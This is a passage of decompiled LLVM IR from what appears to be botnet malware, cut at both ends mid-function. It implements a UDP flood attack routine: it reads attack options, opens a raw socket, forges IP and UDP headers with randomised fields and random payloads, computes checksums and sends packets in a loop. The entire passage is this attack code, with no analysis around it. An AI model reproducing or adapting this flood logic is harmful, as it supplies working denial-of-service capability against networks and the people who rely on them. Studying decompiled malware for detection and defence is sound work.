  store i32 %v0_af80, i32* %r1.global-to-local, align 4
  %v0_af88 = load i32, i32* @r8, align 4
  store i32 %v0_af88, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_af90 = load i32, i32* @r5, align 4
  store i32 %v0_af90, i32* %r0.global-to-local, align 4
  %v5_af94 = inttoptr i32 %v0_af80 to i32*
  %v6_af94 = call i32 @attack_get_opt_int(i32 %v0_af90, i32* %v5_af94, i32 %v0_af88, i32 512, i32 %v6_af7c)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afa0 = load i32, i32* @r4, align 4
  store i32 %v0_afa0, i32* %r1.global-to-local, align 4
  store i32 %v6_af94, i32* @sl, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r0.global-to-local, align 4
  %v5_afac = inttoptr i32 %v0_afa0 to i32*
  %v6_afac = call i32 @attack_get_opt_int(i32 %v0_afa8, i32* %v5_afac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_afb8 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_afb8, i32* %r3.global-to-local, align 4
  %v1_afbc = urem i32 %v6_afac, 256
  store i32 %v1_afbc, i32* %ip.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r4, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r5, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afd0 = inttoptr i32 %v0_afc0 to i32*
  %v6_afd0 = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afd0, i32 24, i32 %v2_afb8, i32 %v1_afbc)
  store i32 %v6_afd0, i32* @sb, align 4
  %v0_afd8 = load i32, i32* @r8, align 4
  store i32 %v0_afd8, i32* %r0.global-to-local, align 4
  %v1_afdc = inttoptr i32 %v0_afd8 to i32*
  %v2_afdc = call i32 @__GI_time(i32* %v1_afdc)
  %v1_afe0 = load i32, i32* @r6, align 4
  %v2_afe0 = add i32 %v1_afe0, %v2_afdc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_aff4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_aff4, i32* %r0.global-to-local, align 4
  %v7_aff8 = icmp eq i32 %v3_aff4, -1
  store i32 %v3_aff4, i32* @fp, align 4
  br i1 %v7_aff8, label %dec_label_pc_b44c, label %dec_label_pc_b004

dec_label_pc_b004:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b00c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b00c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b014 = load i32, i32* @r8, align 4
  store i32 %v0_b014, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b020 = call i32 @__GI_setsockopt(i32 %v3_aff4, i32 %v0_b014, i32 3, i32 %v6_b00c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b020, i32* %r0.global-to-local, align 4
  %v7_b024 = icmp eq i32 %v5_b020, -1
  br i1 %v7_b024, label %dec_label_pc_b458, label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b004
  %v0_b02c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_b038 = urem i32 %v0_b02c, 65536
  %v3_b03c = icmp ugt i32 %v3_b038, 1459
  br i1 %v3_b03c, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_b02c
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_b02c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_b038, %dec_label_pc_b02c ]
  %v0_b048 = phi i32 [ 1460, %bb ], [ %v3_b038, %dec_label_pc_b02c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v6_af60, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_b05c = mul i32 %v6_af7c, 65536
  store i32 %v3_b05c, i32* %r2.global-to-local, align 4
  %v3_b064 = urem i32 %v7_af04, 65536
  %v3_b068 = urem i32 %v6_af60, 65536
  store i32 %v3_b068, i32* %ip.global-to-local, align 4
  %v3_b06c = urem i32 %v6_af7c, 65536
  store i32 %v3_b06c, i32* %r0.global-to-local, align 4
  %v2_b070 = icmp eq i32 %arg2, 0
  %v0_b078 = load i32, i32* @r8, align 4
  store i32 %v0_b078, i32* %stack_var_-44, align 4
  br i1 %v2_b070, label %.dec_label_pc_b1a4.preheader_crit_edge, label %dec_label_pc_b08c

.dec_label_pc_b1a4.preheader_crit_edge:           ; preds = %bb41
  %.pre = add nuw nsw i32 %v0_b048, 8
  %.pre10 = add nuw nsw i32 %v0_b048, 28
  br label %dec_label_pc_b1a4.preheader

dec_label_pc_b08c:                                ; preds = %bb41
  %v1_b094 = add nuw nsw i32 %v0_b048, 28
  %v1_b098 = add nuw nsw i32 %v0_b048, 8
  %tmp42 = mul nuw nsw i32 %v3_b068, 256
  %v3_b0a8 = and i32 %tmp42, 65280
  %v3_b0b0 = mul i32 %v1_b094, 65536
  store i32 %v3_b0b0, i32* @lr, align 4
  %tmp43 = udiv i32 %v6_af60, 256
  %v4_b0b8 = urem i32 %tmp43, 256
  %v5_b0b8 = or i32 %v3_b0a8, %v4_b0b8
  store i32 %v5_b0b8, i32* @sl, align 4
  store i32 %v3_b05c, i32* %r1.global-to-local, align 4
  %tmp44 = mul i32 %v6_af7c, 256
  %v3_b0d0 = and i32 %tmp44, 65280
  %v2_b0d4 = icmp eq i32 %v1_af48, 0
  %tmp45 = mul nuw nsw i32 %v1_b094, 256
  %v3_b0d8 = and i32 %tmp45, 65280
  store i32 %v3_b0d8, i32* %r3.global-to-local, align 4
  %tmp46 = mul i32 %v7_af04, 256
  %v3_b0dc = and i32 %tmp46, 65280
  store i32 %v3_b0dc, i32* %r2.global-to-local, align 4
  %tmp47 = mul nuw nsw i32 %v1_b098, 256
  %v3_b0e0 = and i32 %tmp47, 65280
  store i32 %v3_b0e0, i32* %ip.global-to-local, align 4
  %tmp48 = udiv i32 %v6_af7c, 256
  %v4_b0e4 = urem i32 %tmp48, 256
  %v5_b0e4 = or i32 %v4_b0e4, %v3_b0d0
  store i32 %v5_b0e4, i32* %r0.global-to-local, align 4
  %tmp49 = udiv i32 %v7_af04, 256
  %v4_b0e8 = urem i32 %tmp49, 256
  %v5_b0e8 = or i32 %v4_b0e8, %v3_b0dc
  store i32 %v5_b0e8, i32* @r8, align 4
  %tmp50 = udiv i32 %v1_b094, 256
  %v4_b0ec = urem i32 %tmp50, 256
  %v5_b0ec = or i32 %v4_b0ec, %v3_b0d8
  store i32 %v5_b0ec, i32* @r6, align 4
  %tmp51 = udiv i32 %v1_b098, 256
  %v4_b0f0 = urem i32 %tmp51, 256
  %v5_b0f0 = or i32 %v4_b0f0, %v3_b0e0
  store i32 %v5_b0f0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext11 = mul nuw i32 %v5_b0e4, 65536
  %v4_b178 = sdiv i32 %sext11, 65536
  %v1_b15c = trunc i32 %v5_af3c to i8
  br i1 %v2_b0d4, label %dec_label_pc_b100, label %dec_label_pc_b38c

dec_label_pc_b100:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_b100
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b10c = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_b10c, i32* %r0.global-to-local, align 4
  store i32 %v2_aec8, i32* %r2.global-to-local, align 4
  %v2_b118 = load i32, i32* @r4, align 4
  %v5_b118 = mul i32 %v2_b118, 4
  %v6_b118 = add i32 %v5_b118, %v2_aec8
  %v7_b118 = inttoptr i32 %v6_b118 to i32*
  store i32 %v2_b10c, i32* %v7_b118, align 4
  %v3_b11c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b11c, i32* %r1.global-to-local, align 4
  %v0_b120 = load i32, i32* %r2.global-to-local, align 4
  %v4_b120 = mul i32 %v3_b11c, 4
  %v5_b120 = add i32 %v0_b120, %v4_b120
  %v6_b120 = inttoptr i32 %v5_b120 to i32*
  %v7_b120 = load i32, i32* %v6_b120, align 4
  store i32 %v7_b120, i32* %r3.global-to-local, align 4
  %v1_b124 = inttoptr i32 %v7_b120 to i8*
  %v2_b124 = load i8, i8* %v1_b124, align 1
  %tmp = urem i8 %v2_b124, 16
  %v1_b128 = zext i8 %tmp to i32
  %v1_b12c = or i32 %v1_b128, 64
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = trunc i32 %v1_b12c to i8
  store i8 %v1_b130, i8* %v1_b124, align 1
  %v0_b134 = load i32, i32* %r3.global-to-local, align 4
  %v1_b134 = inttoptr i32 %v0_b134 to i8*
  %v2_b134 = load i8, i8* %v1_b134, align 1
  %v1_b138 = and i8 %v2_b134, -16
  %v1_b13c = or i8 %v1_b138, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_b13c, i8* %v1_b134, align 1
  %v0_b148 = load i32, i32* %ip.global-to-local, align 4
  %v1_b148 = trunc i32 %v0_b148 to i8
  %v2_b148 = load i32, i32* %r3.global-to-local, align 4
  %v3_b148 = add i32 %v2_b148, 9
  %v4_b148 = inttoptr i32 %v3_b148 to i8*
  store i8 %v1_b148, i8* %v4_b148, align 1
  %v2_b150 = load i32, i32* %r3.global-to-local, align 4
  %v3_b150 = add i32 %v2_b150, 1
  %v4_b150 = inttoptr i32 %v3_b150 to i8*
  store i8 %v5_af00, i8* %v4_b150, align 1
  %v0_b158 = load i32, i32* %r1.global-to-local, align 4
  %v3_b158 = mul i32 %v0_b158, 32
  store i32 %v3_b158, i32* %r0.global-to-local, align 4
  %v2_b15c = load i32, i32* %r3.global-to-local, align 4
  %v3_b15c = add i32 %v2_b15c, 8
  %v4_b15c = inttoptr i32 %v3_b15c to i8*
  store i8 %v1_b15c, i8* %v4_b15c, align 1
  %v0_b160 = load i32, i32* @sb, align 4
  %v1_b160 = load i32, i32* %r3.global-to-local, align 4
  %v2_b160 = add i32 %v1_b160, 12
  %v3_b160 = inttoptr i32 %v2_b160 to i32*
  store i32 %v0_b160, i32* %v3_b160, align 4
  %v0_b164 = load i32, i32* %r0.global-to-local, align 4
  %v1_b164 = load i32, i32* %r1.global-to-local, align 4
  %tmp53 = mul i32 %v1_b164, -8
  %v5_b164 = add i32 %v0_b164, %tmp53
  %v1_b168 = load i32, i32* @r7, align 4
  %v2_b168 = add i32 %v5_b164, %v1_b168
  store i32 %v2_b168, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_b170 = add i32 %v1_b164, 1
  store i32 %v1_b170, i32* @r4, align 4
  %v1_b174 = add i32 %v2_b168, 16
  %v2_b174 = inttoptr i32 %v1_b174 to i32*
  %v3_b174 = load i32, i32* %v2_b174, align 4
  store i32 %v3_b174, i32* %r2.global-to-local, align 4
  store i32 %v4_b178, i32* %r0.global-to-local, align 4
  %v0_b17c = load i32, i32* %r3.global-to-local, align 4
  %v1_b17c = add i32 %v0_b17c, 20
  store i32 %v1_b17c, i32* %r1.global-to-local, align 4
  %v0_b184 = load i32, i32* @r6, align 4
  %v1_b184 = trunc i32 %v0_b184 to i16
  %v3_b184 = add i32 %v0_b17c, 2
  %v4_b184 = inttoptr i32 %v3_b184 to i16*
  store i16 %v1_b184, i16* %v4_b184, align 2
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = trunc i32 %v0_b188 to i16
  %v2_b188 = load i32, i32* %r3.global-to-local, align 4
  %v3_b188 = add i32 %v2_b188, 4
  %v4_b188 = inttoptr i32 %v3_b188 to i16*
  store i16 %v1_b188, i16* %v4_b188, align 2
  %v0_b18c = load i32, i32* %r2.global-to-local, align 4
  %v1_b18c = load i32, i32* %r3.global-to-local, align 4
  %v2_b18c = add i32 %v1_b18c, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  %v0_b190 = load i32, i32* @sl, align 4
  %v1_b190 = trunc i32 %v0_b190 to i16
  %v2_b190 = load i32, i32* %r3.global-to-local, align 4
  %v3_b190 = add i32 %v2_b190, 20
  %v4_b190 = inttoptr i32 %v3_b190 to i16*
  store i16 %v1_b190, i16* %v4_b190, align 2
  %v0_b194 = load i32, i32* @r5, align 4
  %v1_b194 = trunc i32 %v0_b194 to i16
  %v2_b194 = load i32, i32* %r1.global-to-local, align 4
  %v3_b194 = add i32 %v2_b194, 4
  %v4_b194 = inttoptr i32 %v3_b194 to i16*
  store i16 %v1_b194, i16* %v4_b194, align 2
  %v0_b198 = load i32, i32* %r0.global-to-local, align 4
  %v1_b198 = trunc i32 %v0_b198 to i16
  %v2_b198 = load i32, i32* %r1.global-to-local, align 4
  %v3_b198 = add i32 %v2_b198, 2
  %v4_b198 = inttoptr i32 %v3_b198 to i16*
  store i16 %v1_b198, i16* %v4_b198, align 2
  %v0_b19c = load i32, i32* @r4, align 4
  store i32 %v0_b19c, i32* %stack_var_-44, align 4
  %v5_b1a0 = icmp slt i32 %v1_b170, %arg2
  br i1 %v5_b1a0, label %dec_label_pc_b100, label %dec_label_pc_b1a4.preheader

dec_label_pc_b1a4.preheader:                      ; preds = %dec_label_pc_b38c, %dec_label_pc_b100, %.dec_label_pc_b1a4.preheader_crit_edge
  %v1_b1c4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_b1a4.preheader_crit_edge ], [ %v1_b094, %dec_label_pc_b100 ], [ %v1_b094, %dec_label_pc_b38c ]
  %v1_b1c0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_b1a4.preheader_crit_edge ], [ %v1_b098, %dec_label_pc_b100 ], [ %v1_b098, %dec_label_pc_b38c ]
  %v3_b324 = icmp eq i32 %v3_b064, 65535
  %v2_b360 = icmp eq i32 %v1_afbc, 0
  br label %dec_label_pc_b1a4

dec_label_pc_b1a4:                                ; preds = %dec_label_pc_b1a4.preheader, %dec_label_pc_b438
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b070, label %dec_label_pc_b438, label %dec_label_pc_b1b8

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1a4
  store i32 %v0_b048, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b1c0.pre-phi, i32* @sl, align 4
  store i32 %v1_b1c4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_b294

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_b294
  %v0_b1cc = load i32, i32* @sb, align 4
  %v7_b1cc = icmp eq i32 %v0_b1cc, -1
  br i1 %v7_b1cc, label %dec_label_pc_b314, label %dec_label_pc_b1d4

dec_label_pc_b1d4:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b1cc
  store i32 %v3_b064, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  br i1 %v3_b324, label %dec_label_pc_b330, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge, %dec_label_pc_b1d4
  %v1_b1ec = phi i32 [ %v1_b1ec.pre, %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge ], [ 65535, %dec_label_pc_b1d4 ]
  store i32 %v3_b068, i32* %r0.global-to-local, align 4
  %v9_b1ec = icmp eq i32 %v3_b068, %v1_b1ec
  br i1 %v9_b1ec, label %dec_label_pc_b344, label %dec_label_pc_b1f4

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b1e8
  %v1_b1f8 = phi i32 [ %v1_b33c, %dec_label_pc_b330 ], [ %v1_b1ec, %dec_label_pc_b1e8 ]
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v9_b1f8 = icmp eq i32 %v3_b06c, %v1_b1f8
  br i1 %v9_b1f8, label %dec_label_pc_b358, label %dec_label_pc_b200

dec_label_pc_b200:                                ; preds = %dec_label_pc_b344, %dec_label_pc_b1f4
  store i32 %v1_afbc, i32* %r2.global-to-local, align 4
  br i1 %v2_b360, label %dec_label_pc_b20c, label %dec_label_pc_b36c

dec_label_pc_b20c:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b358, %dec_label_pc_b36c
  %v2_b210 = load i32, i32* @r5, align 4
  %v3_b210 = add i32 %v2_b210, 10
  %v4_b210 = inttoptr i32 %v3_b210 to i16*
  store i16 0, i16* %v4_b210, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b218 = load i32, i32* @r5, align 4
  store i32 %v0_b218, i32* @r0, align 4
  %v2_b21c = call i32 @checksum_generic(i32 %v0_b218, i32 20)
  %v3_b21c = trunc i32 %v2_b21c to i16
  store i32 %v2_b21c, i32* %r0.global-to-local, align 4
  %v3_b220 = load i32, i32* @r5, align 4
  %v4_b220 = add i32 %v3_b220, 10
  %v5_b220 = inttoptr i32 %v4_b220 to i16*
  store i16 %v3_b21c, i16* %v5_b220, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b228 = load i32, i32* @r6, align 4
  %v3_b228 = add i32 %v2_b228, 6
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  %v0_b22c = load i32, i32* @r6, align 4
  %v1_b22c = add i32 %v0_b22c, 4
  %v2_b22c = inttoptr i32 %v1_b22c to i16*
  %v3_b22c = load i16, i16* %v2_b22c, align 2
  %v4_b22c = zext i16 %v3_b22c to i32
  store i32 %v4_b22c, i32* %r2.global-to-local, align 4
  store i32 %v0_b22c, i32* @r1, align 4
  %v0_b234 = load i32, i32* @sl, align 4
  store i32 %v0_b234, i32* %r3.global-to-local, align 4
  %v0_b238 = load i32, i32* @r5, align 4
  store i32 %v0_b238, i32* %r0.global-to-local, align 4
  %v4_b23c = call i32 @checksum_tcpudp(i32 %v0_b238, i32 %v0_b22c, i32 %v4_b22c, i32 %v0_b234)
  %v5_b23c = trunc i32 %v4_b23c to i16
  store i32 %v4_b23c, i32* %r0.global-to-local, align 4
  %v3_b240 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b240, i32* %r3.global-to-local, align 4
  %v3_b244 = mul i32 %v3_b240, 32
  store i32 %v3_b244, i32* %lr.global-to-local, align 4
  %v3_b248 = load i32, i32* @r6, align 4
  %v4_b248 = add i32 %v3_b248, 6
  %v5_b248 = inttoptr i32 %v4_b248 to i16*
  store i16 %v5_b23c, i16* %v5_b248, align 2
  %v0_b24c = load i32, i32* %lr.global-to-local, align 4
  %v1_b24c = load i32, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v1_b24c, -8
  %v5_b24c = add i32 %v0_b24c, %tmp54
  store i32 %v5_b24c, i32* %lr.global-to-local, align 4
  %v0_b250 = load i32, i32* @r6, align 4
  %v1_b250 = add i32 %v0_b250, 2
  %v2_b250 = inttoptr i32 %v1_b250 to i16*
  %v3_b250 = load i16, i16* %v2_b250, align 2
  %v4_b250 = zext i16 %v3_b250 to i32
  store i32 %v4_b250, i32* @r6, align 4
  %v1_b254 = load i32, i32* @r7, align 4
  %v2_b254 = add i32 %v1_b254, %v5_b24c
  store i32 %v2_b254, i32* @lr, align 4
  %v3_b258 = add i32 %v2_b254, 2
  %v4_b258 = inttoptr i32 %v3_b258 to i16*
  store i16 %v3_b250, i16* %v4_b258, align 2
  %v0_b25c = load i32, i32* @r8, align 4
  store i32 %v0_b25c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b268 = load i32, i32* @r5, align 4
  store i32 %v0_b268, i32* %r1.global-to-local, align 4
  %v0_b26c = load i32, i32* @fp, align 4
  store i32 %v0_b26c, i32* %r0.global-to-local, align 4
  %v0_b270 = load i32, i32* @lr, align 4
  %v6_b278 = call i32 @__libc_sendto(i32 %v0_b26c, i32 %v0_b268, i32 %v0_b25c, i32 16384, i32 %v0_b270, i32 16)
  %v3_b27c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b27c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_b284 = add i32 %v3_b27c, 1
  store i32 %v1_b284, i32* %r0.global-to-local, align 4
  store i32 %v1_b284, i32* %stack_var_-44, align 4
  %v6_b290 = icmp slt i32 %v1_b284, %arg2
  br i1 %v6_b290, label %dec_label_pc_b294, label %dec_label_pc_b438

dec_label_pc_b294:                                ; preds = %dec_label_pc_b20c, %dec_label_pc_b1b8
  %v1_b2a8 = phi i32 [ %v1_b284, %dec_label_pc_b20c ], [ 0, %dec_label_pc_b1b8 ]
  %v5_b298 = mul i32 %v1_b2a8, 24
  %v1_b2a0 = load i32, i32* @r7, align 4
  %v2_b2a0 = add i32 %v1_b2a0, %v5_b298
  store i32 %v2_b2a0, i32* %r3.global-to-local, align 4
  %v1_b2a4 = add i32 %v2_b2a0, 20
  %v2_b2a4 = inttoptr i32 %v1_b2a4 to i8*
  %v3_b2a4 = load i8, i8* %v2_b2a4, align 1
  %v4_b2a4 = zext i8 %v3_b2a4 to i32
  store i32 %v4_b2a4, i32* %r2.global-to-local, align 4
  %v4_b2a8 = mul i32 %v1_b2a8, 4
  %v5_b2a8 = add i32 %v4_b2a8, %v2_aec8
  %v6_b2a8 = inttoptr i32 %v5_b2a8 to i32*
  %v7_b2a8 = load i32, i32* %v6_b2a8, align 4
  store i32 %v7_b2a8, i32* @r5, align 4
  %v1_b2b0 = add i32 %v7_b2a8, 20
  store i32 %v1_b2b0, i32* @r6, align 4
  %tmp55 = icmp ugt i8 %v3_b2a4, 31
  br i1 %tmp55, label %dec_label_pc_b1cc, label %dec_label_pc_b2b8

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b294
  %v1_b2b8 = add i32 %v2_b2a0, 16
  %v2_b2b8 = inttoptr i32 %v1_b2b8 to i32*
  %v3_b2b8 = load i32, i32* %v2_b2b8, align 4
  %v0_b2bc = call i32 @rand_next()
  store i32 %v0_b2bc, i32* %r0.global-to-local, align 4
  %v3_b2c0 = load i32, i32* %stack_var_-44, align 4
  %v5_b2c8 = mul i32 %v3_b2c0, 24
  %v1_b2cc = and i32 %v3_b2b8, 16711680
  store i32 %v1_b2cc, i32* %ip.global-to-local, align 4
  %v3_b2d0 = udiv i32 %v3_b2b8, 16777216
  %v4_b2d4 = udiv i32 %v1_b2cc, 256
  %v5_b2d4 = or i32 %v4_b2d4, %v3_b2d0
  store i32 %v5_b2d4, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* @r7, align 4
  %v2_b2d8 = add i32 %v1_b2d8, %v5_b2c8
  store i32 %v2_b2d8, i32* %r1.global-to-local, align 4
  %v1_b2dc = and i32 %v3_b2b8, 65280
  store i32 %v1_b2dc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = add i32 %v2_b2d8, 20
  %v2_b2e0 = inttoptr i32 %v1_b2e0 to i8*
  %v3_b2e0 = load i8, i8* %v2_b2e0, align 1
  %v4_b2e0 = zext i8 %v3_b2e0 to i32
  store i32 %v4_b2e0, i32* %ip.global-to-local, align 4
  %v5_b2e8 = call i32 @llvm.bswap.i32(i32 %v3_b2b8)
  %v7_b2ec = lshr i32 %v0_b2bc, %v4_b2e0
  %v8_b2ec = add i32 %v7_b2ec, %v5_b2e8
  store i32 %v8_b2ec, i32* %r2.global-to-local, align 4
  %v1_b2f0 = and i32 %v8_b2ec, 16711680
  store i32 %v1_b2f0, i32* %r0.global-to-local, align 4
  %v1_b2fc = and i32 %v8_b2ec, 65280
  store i32 %v1_b2fc, i32* %r1.global-to-local, align 4
  %v5_b304 = call i32 @llvm.bswap.i32(i32 %v8_b2ec)
  store i32 %v5_b304, i32* %r3.global-to-local, align 4
  %v0_b308 = load i32, i32* @sb, align 4
  %v3_b308 = icmp eq i32 %v0_b308, -1
  %v1_b30c = load i32, i32* @r5, align 4
  %v2_b30c = add i32 %v1_b30c, 16
  %v3_b30c = inttoptr i32 %v2_b30c to i32*
  store i32 %v5_b304, i32* %v3_b30c, align 4
  br i1 %v3_b308, label %dec_label_pc_b314, label %dec_label_pc_b1d4

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b1cc
  %v0_b314 = call i32 @rand_next()
  store i32 %v0_b314, i32* %r0.global-to-local, align 4
  store i32 %v3_b064, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v1_b328 = load i32, i32* @r5, align 4
  %v2_b328 = add i32 %v1_b328, 12
  %v3_b328 = inttoptr i32 %v2_b328 to i32*
  store i32 %v0_b314, i32* %v3_b328, align 4
  br i1 %v3_b324, label %dec_label_pc_b330, label %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge

dec_label_pc_b314.dec_label_pc_b1e8_crit_edge:    ; preds = %dec_label_pc_b314
  %v1_b1ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b1e8

dec_label_pc_b330:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b1d4
  %v0_b330 = call i32 @rand_next()
  %v1_b330 = trunc i32 %v0_b330 to i16
  %v3_b334 = load i32, i32* @r5, align 4
  %v4_b334 = add i32 %v3_b334, 4
  %v5_b334 = inttoptr i32 %v4_b334 to i16*
  store i16 %v1_b330, i16* %v5_b334, align 2
  store i32 %v3_b068, i32* %r0.global-to-local, align 4
  %v1_b33c = load i32, i32* @r4, align 4
  %v9_b33c = icmp eq i32 %v3_b068, %v1_b33c
  br i1 %v9_b33c, label %dec_label_pc_b344, label %dec_label_pc_b1f4

dec_label_pc_b344:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b1e8
  %v0_b344 = call i32 @rand_next()
  %v1_b344 = trunc i32 %v0_b344 to i16
  store i32 %v0_b344, i32* %r0.global-to-local, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b34c = load i32, i32* @r4, align 4
  %v9_b34c = icmp eq i32 %v3_b06c, %v1_b34c
  %v3_b350 = load i32, i32* @r5, align 4
  %v4_b350 = add i32 %v3_b350, 20
  %v5_b350 = inttoptr i32 %v4_b350 to i16*
  store i16 %v1_b344, i16* %v5_b350, align 2
  br i1 %v9_b34c, label %dec_label_pc_b358, label %dec_label_pc_b200

dec_label_pc_b358:                                ; preds = %dec_label_pc_b344, %dec_label_pc_b1f4
  %v0_b358 = call i32 @rand_next()
  %v1_b358 = trunc i32 %v0_b358 to i16
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  store i32 %v1_afbc, i32* %r2.global-to-local, align 4
  %v3_b364 = load i32, i32* @r6, align 4
  %v4_b364 = add i32 %v3_b364, 2
  %v5_b364 = inttoptr i32 %v4_b364 to i16*
  store i16 %v1_b358, i16* %v5_b364, align 2
  br i1 %v2_b360, label %dec_label_pc_b20c, label %dec_label_pc_b36c

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b358
  %v0_b36c = load i32, i32* @r5, align 4
  %v1_b36c = add i32 %v0_b36c, 28
  store i32 %v1_b36c, i32* @r4, align 4
  store i32 %v1_b36c, i32* %r0.global-to-local, align 4
  store i32 %v0_b048, i32* %r1.global-to-local, align 4
  %v2_b378 = call i32 @rand_alphastr(i32 %v1_b36c, i32 %v0_b048)
  store i32 %v2_b378, i32* %r0.global-to-local, align 4
  store i32 %v0_b048, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b384 = load i32, i32* @r4, align 4
  %v4_b384 = add i32 %v3_b384, %v0_b048
  %v5_b384 = inttoptr i32 %v4_b384 to i8*
  store i8 0, i8* %v5_b384, align 1
  br label %dec_label_pc_b20c

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_b38c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b398 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_b398, i32* %r0.global-to-local, align 4
  store i32 %v2_aec8, i32* %ip.global-to-local, align 4
  %v3_b3a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3a0, i32* %r1.global-to-local, align 4
  %v2_b3a4 = load i32, i32* @r4, align 4
  %v5_b3a4 = mul i32 %v2_b3a4, 4
  %v6_b3a4 = add i32 %v5_b3a4, %v2_aec8
  %v7_b3a4 = inttoptr i32 %v6_b3a4 to i32*
  store i32 %v2_b398, i32* %v7_b3a4, align 4
  %v0_b3a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_b3a8 = mul i32 %v1_b3a8, 4
  %v5_b3a8 = add i32 %v4_b3a8, %v0_b3a8
  %v6_b3a8 = inttoptr i32 %v5_b3a8 to i32*
  %v7_b3a8 = load i32, i32* %v6_b3a8, align 4
  store i32 %v7_b3a8, i32* %r3.global-to-local, align 4
  %v1_b3ac = inttoptr i32 %v7_b3a8 to i8*
  %v2_b3ac = load i8, i8* %v1_b3ac, align 1
  %tmp56 = urem i8 %v2_b3ac, 16
  %v1_b3b0 = zext i8 %tmp56 to i32
  %v1_b3b4 = or i32 %v1_b3b0, 64
  store i32 %v1_b3b4, i32* %r2.global-to-local, align 4
  %v1_b3b8 = trunc i32 %v1_b3b4 to i8
  store i8 %v1_b3b8, i8* %v1_b3ac, align 1
